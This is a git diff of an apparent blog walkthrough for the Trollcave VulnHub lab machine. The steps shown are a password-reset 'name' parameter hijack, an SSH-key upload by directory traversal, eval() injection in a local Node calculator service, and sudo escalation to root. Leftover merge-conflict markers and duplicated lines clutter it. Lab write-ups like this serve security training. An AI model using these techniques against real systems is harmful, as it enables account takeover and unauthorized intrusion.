@@ -9,6 +9,7 @@ This is a boot2root machine that was created by [David Yates][2], and hosted at 
 
 <!--more-->
 ## Information Gathering
+
 We start of with an nmap scan and get these ports open:
 ```
 nmap -Pn -sCV -p22,80 -oN nmap/Basic_192.168.251.9.nmap 192.168.251.9
@@ -31,6 +32,14 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 We'll start off with port 80:
+=======
+Changes13052020
+We start of with an nmap scan and get these ports open: 
+PORT   STATE SERVICE                                                                                                                                                  
+22/tcp open  ssh                                                                                                                                                      
+80/tcp open  http                                                                                                                                                     
+                                                                                                                                                                      
+>>>>>>> 16f31e357dc88ca176e374cb0f82fbe969f59b61
 
 ![5-1.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-1.png)
 
@@ -148,39 +157,38 @@ t password reset. busy with this at the moment, but having trouble with site ema
 of this.\n\nso far i've implemented a `password_resets` resource in rails and it's about 90% working except for the email thing. it's very frustrating. if anyone has 
 any suggestions about how to get the email working, please drop me a pm\n\n--coderguy\n\t\t","user_id":4,"created_at":"2017-10-23T09:39:43.057Z","updated_at":"2017-10-23T09:39:43.057Z"}{"id":7,"title":"Welcome to the TrollCave!","content":"\nThe Trollcave is a community blogging website for people with a sense of humour. As long as you're not an idiot, we're very friendly. Registration is free, so [what are you waiting for](/register)?\n\t\t","user_id":1,"created_at":"2017-10-23T09:39:43.103Z","updated_at":"2017-10-23T09:39:43.103Z"}<html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></html><html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></html><html><body>You are being <a href="http://192.168.251.9/">redirected</a>.</body></html>{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}{"status":"404","error":"Not Found"}
 ```
-Remember when reading about: 
+When reading the blog we come across a user talking about password_resets: 
 
 ```
 so far i've implemented a `password_resets` resource in rails and it's about 90% working except for the email thing. it's very frustrating
 ```
 ![5-4.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-4.png)
 
-It alludes to using this to reset password.
+Google search tells us to reset the password we use:
 http://192.168.251.9/password_resets/new
 
 ![5-5.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-5.png)
 
 It sends the link
 
+![5-4.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-5.png)
 
-
-Note the end of the string has the name parameter. We'll abuse this part.
-We already know all the users. How about resetting password for King `http://192.168.251.9/password_resets/edit.9AY5mR6eT1CmgWazJRsdvw?name=King`
-
-
-
-
-Go to admin panel and enable file upload 
+Note the end of the string has the parameter [name]. We'll abuse this part.
+Since we already know all the users. How about resetting password for King `http://192.168.251.9/password_resets/edit.9AY5mR6eT1CmgWazJRsdvw?name=King`
 
 
 
-Reading through through the users blogs we come across
+
+Once we're logged in we go to admin panel and enable file upload 
+![5-4.png](/assets/images/posts/trollcave-vulnhub-walkthrough/5-6.png)
 
 
-This tells us we've got a user called `rails` and we've also enabled file upload which was previpusly disabled.
-Attempting to u plad and execute ruby shell proves unfruitful.
+Reading through the user King blogs we come across
 
-We know we already running ssh. We shall then upload a ssh key using directory traversal into the home directory of 
+
+This tells us we've got a user called `rails`. Attempting to upload and execute reverse shell (php or ruby) proves unfruitful.
+
+But not all hope is lost the box is running ssh. How about uploadindg a ssh key we control via directory traversal into the home directory of rails.
 
 ../../../../../../../../home/rails/.ssh/authorized_keys
 
@@ -191,9 +199,7 @@ Generate a ssh key as follows
 Upload the key as follows:
 Note we'll upload with user as xer upload as King don't work:
 
-
-
-ssh -i trollcave rails@192.168.251.9
+	ssh -i trollcave rails@192.168.251.9
 
 We'll run LinEnum and les.
 
@@ -211,9 +217,14 @@ drwxrwxr-x 2 king king 4.0K Sep 28  2017 calc
 -rw-r--r-- 1 king king  675 Sep 16  2016 .profile
 -rw-r--r-- 1 king king    0 Sep 16  2016 .sudo_as_admin_successful
 ```
+<<<<<<< HEAD
 He's running a program called 
 ```
 drwxrwxr-x 2 king king 4.0K Sep 28  2017 calc
+
+
+He's running a program called  calc
+```
 
 rails@trollcave:/home/king/calc$ cat calc.js
 var http = require("http");
@@ -305,13 +316,13 @@ function display_404(pathname, request, response)
 // Start the server and route the requests
 start(route);
 rails@trollcave:/home/king/calc$
-
+```
 http.createServer(onRequest).listen(8888, '127.0.0.1');
 console.log("Server started"); 
 
 Its tells us its running on 8888.
 Confirmed by, 
-
+```
 [-] Listening TCP:
 Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
@@ -322,9 +333,11 @@ tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      
 tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      - 
 tcp6       0      0 :::22                   :::*                    LISTEN      - 
 tcp6       0      0 ::1:5432                :::*                    LISTEN      - 
+```
 
-We also know that,
+Taking a closer look at this function it uses the eval function. According this [site][5] it's advises against using the eval function as it is exploitable; we'll go ahead and exploit it 
 
+```
 function calc(pathname, request, query, response)
 {
         sum = query.split('=')[1];
@@ -333,41 +346,43 @@ function calc(pathname, request, query, response)
 
         response.end(eval(sum).toString());
 }
- The eval value is exploitable: 
+```
+ 
 
-We'll do some port forwarding
+First we'll do some port forwarding so that we can access it on `localhost:8888`
 kali@kali:~/vulnhub/trollcave$ ssh -L 8888:127.0.0.1:8888 -i trollcave rails@192.168.251.9 -f -N
 
-Access the port on our local browser:
 
-localhost:8888
 
 
 
 When we go to calculate looks like it doesn't work. We intercept the request using Burp.
 
-http://localhost:8888/calc?sum=1%2B1
+	http://localhost:8888/calc?sum=1%2B1
 
 
-From function we can tell the value is converted to a string. When we execute this and get 
+From function the sum parameter is converted to string then passed to eval. When we pass a string, we get the error below; 
 
-[object Object]
+	[object Object]
 
-returned means execution is possible. 
+This means execution is possible. 
 
 
 
-Hence, create a file with a reverse shell and put it in /home/rails/rs.sh
+Hence, create a file with a reverse shell and put it in /home/rails/rs.sh. Make sure its executable and pass it as a variable to url above.
 Start a listener and run it.    
 
 
 
 
 
-
+We get a shell with the id as King. 
+sudo -l shows he can run commands as root with no password.
+Boom box done.
 Then we in as root.
 
 [1]: https://www.vulnhub.com/entry/trollcave-12,230/
 [2]: https://twitter.com/@davidyat_es
 [3]: https://www.vulnhub.com/
 [4]: https://github.com/21y4d/nmapAutomator
+[5]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval
